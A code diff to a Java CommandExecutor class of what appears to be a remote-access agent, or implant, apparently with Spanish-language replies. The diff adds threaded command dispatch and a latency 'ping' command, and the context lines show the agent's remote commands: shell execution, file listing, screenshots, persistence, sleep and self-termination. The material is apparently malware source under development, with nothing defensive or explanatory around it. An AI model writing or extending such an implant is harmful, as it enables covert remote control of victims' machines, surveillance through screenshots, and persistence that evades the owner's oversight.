@@ -26,6 +26,20 @@ public final class CommandExecutor {
 			}
 			String command = args.get(0).toLowerCase();
 			String raw = content.substring(Math.min(content.length(), args.get(0).length())).trim();
+			if (command.equals("cd") || command.equals("kill")) {
+				dispatch(command, raw, args, message);
+			} else {
+				poller.submit(() -> dispatch(command, raw, args, message));
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Command failed", throwable);
+			poller.reply("Error: " + throwable.getMessage());
+		}
+	}
+
+	private void dispatch(String command, String raw, List<String> args, Map<String, Object> message) {
+		Log.debug("Command: " + command);
+		try {
 			switch (command) {
 				case "shell" -> shell(raw);
 				case "ls" -> list(args.size() > 1 ? resolve(args.get(1)) : poller.cwd());
@@ -37,6 +51,7 @@ public final class CommandExecutor {
 				case "screenshot" -> screenshot();
 				case "persist" -> persist(args);
 				case "sleep" -> sleep(args);
+				case "ping" -> ping(message);
 				case "kill" -> {
 					poller.reply("Cerrando agente");
 					poller.kill();
@@ -218,8 +233,25 @@ public final class CommandExecutor {
 			}
 			Thread.sleep(millis);
 			poller.reply("Dormido " + millis + " ms");
+		} catch (InterruptedException interrupted) {
+			poller.reply("interrumpido");
 		} catch (Throwable throwable) {
 			poller.reply("Error: " + throwable.getMessage());
+		}
+	}
+
+	private void ping(Map<String, Object> message) {
+		String timestamp = Json.str(message, "timestamp", "");
+		if (timestamp.isEmpty()) {
+			poller.reply("pong");
+			return;
+		}
+		try {
+			long sent = java.time.Instant.parse(timestamp).toEpochMilli();
+			long elapsed = Math.max(0L, System.currentTimeMillis() - sent);
+			poller.reply("pong " + elapsed + " ms");
+		} catch (Throwable throwable) {
+			poller.reply("pong");
 		}
 	}
 
